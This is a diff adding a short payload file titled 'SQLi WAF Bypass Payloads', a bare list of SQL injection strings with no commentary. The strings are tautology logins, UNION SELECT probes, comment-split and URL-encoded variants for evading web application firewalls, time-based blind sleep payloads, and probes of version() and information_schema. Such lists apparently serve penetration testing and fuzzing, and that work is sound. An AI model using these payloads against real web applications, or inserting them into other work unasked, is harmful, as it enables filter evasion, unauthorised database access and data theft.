@@ -1,0 +1,19 @@
+# SQLi WAF Bypass Payloads
+' or 1=1#
+' or 1=1--
+" or 1=1#
+" or 1=1--
+' AnD 1=1
+' OR '1'='1
+' OR 'x'='x
+' AnD '1'='1
+1' ORDER BY 1--+
+' UNION SELECT 1,2,3--
+' UNION/**/SELECT/**/1,2,3--
+' /*!UNION*/ SELECT 1,2,3--
+' %2F%2A!UNION%2A%2F SELECT 1,2,3--
+' uni/**/on se/**/lect 1,2,3--
+' and 1 in (select sleep(5))--
+' || (select sleep(5)) --
+1' and substring(version(),1,1) = '5' --
+' and (select count(*) from information_schema.tables) > 0 --
